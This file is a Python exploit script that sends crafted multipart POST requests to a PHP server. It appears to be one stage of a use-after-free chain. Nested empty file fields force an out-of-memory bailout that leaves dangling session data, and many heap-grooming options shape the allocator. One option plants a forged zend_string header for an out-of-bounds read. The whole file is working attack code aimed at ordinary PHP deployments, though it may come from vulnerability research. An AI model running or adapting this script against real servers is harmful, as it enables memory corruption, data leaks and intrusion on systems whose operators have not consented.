#!/usr/bin/env python3
# Vendored from de0/ so the pure chain is self-contained.
"""Cheap-OOM A for the display_errors=Off cross-request chain.

The multipart parser OOMs while reading nested empty file fields (before the
request reaches normal module RINIT completion).  The OOM bailout skips the
module shutdown, and ZendMM only resets chunk maps, so the worker keeps
dangling PS(http_session_vars) / PS(id) values in the chunk.

usage:
  python3 cheap_oom_a.py --port 18098 --parts 880 --depth 64
  python3 cheap_oom_a.py --port 18098 --parts 880 --depth 64 --fillers 40

--fillers adds short (bin-32) fields before the nested parts.  They shift the
dangling reference within the chunk; one filler is roughly +0x80 in the
8M/8.4.26 layout.
"""
from __future__ import annotations

import argparse
import socket
import sys


def nest_name(i: int, depth: int, key_pad: int = 0) -> bytes:
    if depth < 2:
        raise ValueError("depth must be >= 2")
    return ("files[R%05d%s]" % (i, "K" * key_pad)).encode() + b"[a]" * (depth - 2)


def build_body(parts: int, depth: int, fillers: int, sid: bytes,
               progress: bytes, boundary: bytes, progress_last: bool = False,
               fillers128: int = 0, fillers1500: int = 0,
               fillers128_last: bool = False, fillers896: int = 0,
               with_file: bool = False, nested_plain: bool = False,
               file_last: bool = False, file_name_len: int = 103,
               file_filename_len: int = 99, nest_value_len: int = 0,
               progress_before_file: bool = False, big_values: int = 0,
               big_value_len: int = 4000, nest_filename_len: int = 0,
               nest_key_pad: int = 0, nest_ctype_len: int = 0,
               big_after_fillers: bool = False, nest_crlf: bool = False,
               mixed_file: int = -1, mixed_filename_len: int = 1,
               mixed_ctype_len: int = 103, donors64: int = 0,
               mixed2_file: int = -1, mixed2_ctype_len: int = 231,
               drainers256: int = 0, burners1200: int = 0,
               burner_len: int = 1200, big_pattern: bool = False,
               big_forge_len: int = 0, big_forge_off: int = 0xFE8,
               shift40: int = 0) -> bytes:
    out = bytearray()

    def file_part() -> None:
        out.extend(b"--" + boundary +
                   b"\r\nContent-Disposition: form-data; name=\"" + b"F" * file_name_len +
                   b"\"; filename=\"" + b"A" * file_filename_len + b".txt\"\r\n"
                   b"Content-Type: application/octet-stream\r\n\r\n" +
                   b"A" * 64 + b"\r\n")

    def part(name: bytes, value: bytes = b"", filename: bytes | None = None) -> None:
        out.extend(b"--" + boundary + b"\r\nContent-Disposition: form-data; name=\"" +
                   name + b"\"")
        if filename is not None:
            out.extend(b"; filename=\"" + filename + b"\"")
        out.extend(b"\r\n\r\n" + value + b"\r\n")

    part(b"PHPSESSID", sid)
    if not progress_last and not progress_before_file:
        part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
    if with_file and not file_last:
        file_part()
    for i in range(fillers):
        part(("%03d" % i).encode(), b"x")
    if not fillers128_last:
        for i in range(fillers128):
            part(("f%04d" % i).encode().ljust(103, b"x")[:103], b"v" * 8)
    for i in range(fillers1500):
        part(("x%04d" % i).encode(), b"V" * 1500)
    for i in range(fillers896):
        part(("y%04d" % i).encode(), b"W" * 871)
    for i in range(parts):
        # Empty file part: the header ends at the blank line and the next
        # boundary follows immediately, so the part has an empty body.
        is_mixed = (i == mixed_file)
        is_mixed2 = (i == mixed2_file)
        if is_mixed2:
            ctype = b"C" * mixed2_ctype_len
        elif is_mixed:
            ctype = b"C" * mixed_ctype_len
        elif nest_ctype_len:
            ctype = b"C" * nest_ctype_len
        else:
            ctype = b"application/octet-stream"
        out.extend(b"--" + boundary +
                   b"\r\nContent-Disposition: form-data; name=\"" +
                   nest_name(i, depth, nest_key_pad) + b"\"")
        if is_mixed or is_mixed2:
            out.extend(b"; filename=\"" + b"A" * mixed_filename_len + b"\"")
        elif not nested_plain:
            if nest_filename_len:
                out.extend(b"; filename=\"" + b"A" * nest_filename_len + b"\"")
            else:
                out.extend(b"; filename=\"\"")
        if not nested_plain:
            out.extend(b"\r\nContent-Type: " + ctype)
        out.extend(b"\r\n\r\n")
        if nest_crlf:
            out.extend(b"\r\n")
        if nest_value_len:
            out.extend(b"V" * nest_value_len + b"\r\n")
    def big_val() -> bytes:
        if big_pattern:
            v = bytearray(big_value_len)
            for off in range(0, big_value_len - 7, 8):
                w = ((off << 8) | 0x42) & 0xffffffffffffffff
                v[off:off+8] = w.to_bytes(8, "little")
        else:
            v = bytearray(b"B" * big_value_len)
        if big_forge_len:
            k = big_forge_off
            if k + 0x18 < big_value_len:
                v[k:k+4] = (1).to_bytes(4, "little")
                v[k+4:k+8] = (0x56).to_bytes(4, "little")
                v[k+8:k+16] = (0).to_bytes(8, "little")
                v[k+0x10:k+0x18] = big_forge_len.to_bytes(8, "little")
                v[k+0x18:k+0x28] = b"ABCDEFGHIJKLMNOP"
                if k + 0x18 + big_forge_len < big_value_len:
                    v[k + 0x18 + big_forge_len] = 0
        return bytes(v)
    if not big_after_fillers:
        for i in range(big_values):
            part(("b%04d" % i).encode(), big_val())
    if fillers128_last:
        for i in range(fillers128):
            part(("f%04d" % i).encode().ljust(103, b"x")[:103], b"v" * 8)
    if big_after_fillers:
        for i in range(big_values):
            part(("b%04d" % i).encode(), big_val())
    for i in range(burners1200):
        part(("u%02d" % i).encode(), b"U" * burner_len)
    for i in range(shift40):
        part(("h%02d" % i).encode().ljust(12, b"q")[:12], b"")
    for i in range(drainers256):
        part(("e%02d" % i).encode().ljust(231, b"x")[:231], b"")
    for i in range(donors64):
        part(("d%02d" % i).encode().ljust(39, b"x")[:39], b"")
    if progress_before_file:
        part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
    if with_file and file_last:
        file_part()
    if progress_last:
        part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
    out.extend(b"--" + boundary + b"--\r\n")
    return bytes(out)


def main() -> int:
    ap = argparse.ArgumentParser(
        description="cheap-OOM A (nested empty file fields) for display_errors=Off")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8080)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--parts", type=int, default=880,
                    help="nested empty file fields (default: 880)")
    ap.add_argument("--depth", type=int, default=64,
                    help="nesting depth of files[Rxxxxx][a]...[a] (default: 64)")
    ap.add_argument("--fillers", type=int, default=0,
                    help="short bin-32 fields before the nested parts (default: 0)")
    ap.add_argument("--fillers128", type=int, default=0,
                    help="103-byte name / 8-byte value fields (bin-128) before the nested parts")
    ap.add_argument("--fillers1500", type=int, default=0,
                    help="1500-byte values (bin-1536, 2 slots/page) before the nested parts")
    ap.add_argument("--fillers128-last", action="store_true",
                    help="place the bin-128 fillers after the nested parts")
    ap.add_argument("--fillers896", type=int, default=0,
                    help="871-byte values (bin-896) for the 256-char session id")
    ap.add_argument("--with-file", action="store_true",
                    help="add a real file part (103-byte field name and filename)")
    ap.add_argument("--file-last", action="store_true",
                    help="place the real file part after the nested fields")
    ap.add_argument("--nested-plain", action="store_true",
                    help="nested fields are plain fields (no filename=), so no "
                         "FILE_START callback until a file part appears")
    ap.add_argument("--file-name-len", type=int, default=103,
                    help="length of the real file part's field name (default 103)")
    ap.add_argument("--file-filename-len", type=int, default=99,
                    help="length of the real file part's filename (default 99)")
    ap.add_argument("--big-values", type=int, default=0,
                    help="plain fields with a large value placed after the nested "
                         "fields (4000-byte values take one page each)")
    ap.add_argument("--big-value-len", type=int, default=4000,
                    help="byte length of each --big-values value (default 4000)")
    ap.add_argument("--nest-ctype-len", type=int, default=0,
                    help="Content-Type length for nested file parts; 103 stores "
                         "one bin-128 zend_string in $_FILES[type] per part")
    ap.add_argument("--mixed2-file", type=int, default=-1,
                    help="second mixed file index with a 231-byte Content-Type "
                         "(stores one bin-256 type string)")
    ap.add_argument("--mixed2-ctype-len", type=int, default=231,
                    help="Content-Type length for --mixed2-file (default 231)")
    ap.add_argument("--shift40", type=int, default=0,
                    help="plain fields with 12-char names placed before the "
                         "progress field; each consumes two bin-40 keys")
    ap.add_argument("--big-forge-len", type=lambda x: int(x, 0), default=0,
                    help="write a fake interned zend_string header at "
                         "--big-forge-off inside every big value; the len field "
                         "is this value (OOB read length)")
    ap.add_argument("--big-forge-off", type=lambda x: int(x, 0), default=0xFE8,
                    help="data offset of the fake header inside big values")
    ap.add_argument("--big-pattern", action="store_true",
                    help="fill big values with 8-byte position tags "
                         "((offset<<8)|0x42) to locate their data at runtime")
    ap.add_argument("--burners1200", type=int, default=0,
                    help="fields with 1200-byte values placed after the big "
                         "values; three bin-1280 allocations fill one page")
    ap.add_argument("--burner-len", type=int, default=1200,
                    help="byte length of each --burners1200 value (default 1200)")
    ap.add_argument("--drainers256", type=int, default=0,
                    help="fields with 231-char names placed after the big values; "
                         "each consumes two bin-256 keys")
    ap.add_argument("--donors64", type=int, default=0,
                    help="fields with 39-char names placed just before the "
                         "progress field; each consumes two bin-64 keys")
    ap.add_argument("--mixed-file", type=int, default=-1,
                    help="index of one file part with a non-empty short filename "
                         "and a --mixed-ctype-len Content-Type (stores one "
                         "bin-128 type string while the rest stay empty)")
    ap.add_argument("--mixed-filename-len", type=int, default=1,
                    help="filename length for --mixed-file (default 1)")
    ap.add_argument("--mixed-ctype-len", type=int, default=103,
                    help="Content-Type length for --mixed-file (default 103)")
    ap.add_argument("--nest-crlf", action="store_true",
                    help="add the delimiter CRLF after an empty nested file "
                         "body (proper multipart; avoids temp-file uploads)")
    ap.add_argument("--big-after-fillers", action="store_true",
                    help="emit --big-values after the bin-128 fillers")
    ap.add_argument("--nest-key-pad", type=int, default=0,
                    help="pad the Rxxxxx component so the first-level $_FILES "
                         "key is a bin-128 zend_string (90 -> 96 chars)")
    ap.add_argument("--nest-filename-len", type=int, default=0,
                    help="filename length for nested file fields; 103 stores a "
                         "bin-128 zend_string in $_FILES per part")
    ap.add_argument("--nest-value-len", type=int, default=0,
                    help="give each nested plain field a value of N bytes; 100 "
                         "makes the stored leaf value a bin-128 zend_string")
    ap.add_argument("--sid", default="a" * 32, help="PHPSESSID value (default: 32 x 'a')")
    ap.add_argument("--sid-hex", default="",
                    help="PHPSESSID as hex bytes (overrides --sid), e.g. 00")
    ap.add_argument("--progress", default="k0",
                    help="PHP_SESSION_UPLOAD_PROGRESS value (default: k0)")
    ap.add_argument("--progress-last", action="store_true",
                    help="place PHP_SESSION_UPLOAD_PROGRESS after the nested fields")
    ap.add_argument("--progress-before-file", action="store_true",
                    help="place PHP_SESSION_UPLOAD_PROGRESS after the nested fields "
                         "but before the final real file part (so only the final "
                         "FILE_START runs the session init)")
    ap.add_argument("--boundary", default="C" * 10)
    ap.add_argument("--timeout", type=float, default=60.0)
    ap.add_argument("--save-response", default="",
                    help="write the raw HTTP response to this path")
    args = ap.parse_args()

    boundary = args.boundary.encode()
    sid = bytes.fromhex(args.sid_hex) if args.sid_hex else args.sid.encode()
    body = build_body(args.parts, args.depth, args.fillers,
                      sid, args.progress.encode(), boundary, args.progress_last,
                      args.fillers128, args.fillers1500,
                      args.fillers128_last, args.fillers896, args.with_file,
                      args.nested_plain, args.file_last,
                      args.file_name_len, args.file_filename_len,
                      args.nest_value_len, args.progress_before_file,
                      args.big_values, args.big_value_len,
                      args.nest_filename_len, args.nest_key_pad,
                      args.nest_ctype_len, args.big_after_fillers,
                      args.nest_crlf, args.mixed_file,
                      args.mixed_filename_len, args.mixed_ctype_len,
                      args.donors64, args.mixed2_file,
                      args.mixed2_ctype_len, args.drainers256,
                      args.burners1200, args.burner_len, args.big_pattern,
                      args.big_forge_len, args.big_forge_off, args.shift40)
    req = ("POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
           "Content-Type: multipart/form-data; boundary=%s\r\n"
           "Content-Length: %d\r\nConnection: close\r\n\r\n" %
           (args.path, args.host, args.port, args.boundary, len(body))).encode()

    resp = bytearray()
    try:
        s = socket.create_connection((args.host, args.port), timeout=args.timeout)
        s.settimeout(args.timeout)
        try:
            s.sendall(req + body)
            while len(resp) < 1 << 20:
                chunk = s.recv(65536)
                if not chunk:
                    break
                resp.extend(chunk)
        except OSError:
            pass
        s.close()
    except OSError as exc:
        print("connect_error %r" % (exc,), file=sys.stderr)
        return 2

    if args.save_response:
        with open(args.save_response, "wb") as fh:
            fh.write(bytes(resp))
    status = bytes(resp).split(b"\r\n", 1)[0][:40].decode("latin1", "replace")
    print("parts=%d depth=%d fillers=%d f128=%d f1500=%d progress_last=%s resp=%d status=%r" %
          (args.parts, args.depth, args.fillers, args.fillers128,
           args.fillers1500, args.progress_last, len(resp), status))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
